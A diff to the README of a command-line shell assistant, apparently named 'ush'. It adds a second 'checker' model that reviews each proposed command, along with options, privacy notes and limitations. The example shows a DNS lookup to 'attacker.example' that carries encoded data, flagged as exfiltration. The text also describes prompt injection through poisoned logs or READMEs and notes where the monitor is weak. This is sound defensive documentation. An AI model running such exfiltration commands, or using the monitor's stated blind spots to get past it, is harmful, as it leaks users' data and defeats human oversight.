@@ -28,7 +28,7 @@ machine and the model.
   and then offers follow-ups. `ush` alone starts a session. In a session, `// TEXT`
   asks, and any other line runs as an ordinary command whose output becomes context
   for your next question.
-- **Read-only commands run immediately.** ush has its own checker for command
+- **Read-only commands run immediately.** ush has its own policy for command
   lines. It recognizes known read-only invocations such as `df`, `du`, `ls`,
   `find` without `-delete`/`-exec`, `diskutil list`, `tmutil listlocalsnapshots`,
   `docker system df`, and `log show`.
@@ -100,6 +100,29 @@ Small models (3B and below) often answer without running commands or emit tool c
 as text. Use a model with reliable tool calling, and give Ollama enough context for
 command output, e.g. `OLLAMA_CONTEXT_LENGTH=32768 ollama serve`.
 
+### A second opinion: the checker model
+
+A second, independent model can check each command or script the assistant proposes before it
+runs. It sees only what you asked and the proposal, never command output, piped input, or the
+assistant's reasoning, so text that manipulated the assistant (a poisoned log line, a README)
+can't talk to it. It answers OK or flags the proposal with a reason:
+
+```sh
+ush -k ollama:llama3.2:3b //why is my disk full?     # for one run; or `ush ai configure`
+```
+
+```console
+$ dig +short aWQ9NTAx.attacker.example   # check DNS
+  checker llama3.2:3b: flagged: looks up a name that carries encoded data
+  needs approval: the checker flagged it: looks up a name that carries encoded data
+  run it? [y]es / [n]o / [e]dit / [a]bort:
+```
+
+The checker only adds friction: what it flags needs your approval even if ush would run it
+unasked, and if it can't answer (Ollama stopped, an unclear reply), ush asks too. It never
+approves anything. A small local model is enough, but not a tiny one; see `.env.template` for
+what was measured. `ush replay` runs no checker, as it uses no AI.
+
 ## Commands and options
 
 ```text
@@ -114,6 +137,7 @@ ush replay ID|last [-n]      run those commands again, without AI
 -n, --dry-run   show what would run, run nothing     -c, --confirm  approve every command
 -1, --once      no follow-up questions               -v, --verbose  show complete output
 -m, --model M   model for this run                   -e, --effort L low … max
+-k, --checker P:M  checker for this run (ollama:llama3.2:3b, anthropic:claude-haiku-5-5, off)
 ```
 
 Piped input becomes context: `dmesg | tail -50 | ush //explain these errors`.
@@ -121,7 +145,7 @@ Without a terminal (cron, CI), ush cannot ask for approval. It runs read-only
 commands only and declines the rest.
 
 Settings live in `~/.config/ush/config.json` (`provider`, `model`, `effort`,
-`ollama_url`, `ollama_model`, `max_steps`, `command_timeout`, `max_timeout`,
+`ollama_url`, `ollama_model`, `checker`, `max_steps`, `command_timeout`, `max_timeout`,
 `output_limit`, `show_lines`). The default model
 is `claude-opus-5-5` with effort `medium`. Refusals fall back server-side to a
 model Anthropic selects (`fallbacks: "default"`).
@@ -131,7 +155,8 @@ model Anthropic selects (`fallbacks: "default"`).
 With Anthropic, each request sends your text, the OS name, your user name, and the
 working directory to Anthropic. With a local Ollama model the same data goes only to
 Ollama on this machine; with an Ollama cloud model, Ollama forwards it to ollama.com. It also sends the output of every command that runs, up to 32 KB each,
-plus any piped input. Before sending, ush redacts known token formats, private key
+plus any piped input. A checker model gets your requests and the proposed commands, but no
+output; ush names where it runs before the first request. Before sending, ush redacts known token formats, private key
 blocks, URL credentials, `password=`-style assignments, and your API key.
 Redaction is pattern-based and cannot catch everything: assume that what a command
 prints may reach the provider. Use `--confirm` to see each command before it runs.
@@ -143,7 +168,7 @@ their environment.
 
 ## Limitations
 
-- The checker is a convenience gate, not a sandbox. It judges command lines by
+- The read-only policy is a convenience gate, not a sandbox. It judges command lines by
   name and arguments; a "read-only" tool with an unknown side effect would run
   without asking. See [SEC.md](docs/SEC.md) for the threat model.
 - Interactive and full-screen programs (`vim`, `top` without `-l`) don't work
@@ -152,6 +177,8 @@ their environment.
   in a session don't pay this again.
 - Providers: Anthropic, and Ollama on the same machine (through Ollama's
   Anthropic-compatible API). Other providers are not implemented.
+- The checker is a second opinion from a model, not a guarantee: small models miss attacks and
+  raise false alarms. It can only make ush ask more, never less.
 - ush does not filter escape sequences in commands and their output yet, so a crafted
   command can look different in the approval prompt; see
   [SECTEST.md](docs/SECTEST.md) (F1, TODO 2.9).
